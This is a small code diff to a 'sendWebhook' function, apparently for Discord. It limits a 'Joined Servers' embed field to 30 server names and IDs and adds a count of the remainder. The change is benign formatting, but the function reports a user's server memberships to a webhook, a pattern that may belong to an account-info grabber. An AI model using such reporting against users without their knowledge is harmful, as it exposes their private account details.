@@ -40,9 +40,11 @@ export const sendWebhook = async (
         ];
 
         if (Array.isArray(ownGuilds) && ownGuilds.length > 0) {
+          const displayGuilds = ownGuilds.slice(0, 30);
+          const remainingGuilds = ownGuilds.length > 30 ? ` ( ${ownGuilds.length - 30} more )` : '';
           fields.push({
             name: "🧑‍💻 Joined Servers",
-            value: ownGuilds.map((guild) => `${guild.name} (${guild.id})`).join("\n"),
+            value: displayGuilds.map((guild) => `${guild.name} (${guild.id})`).join("\n") + remainingGuilds,
             inline: false
           });
         }
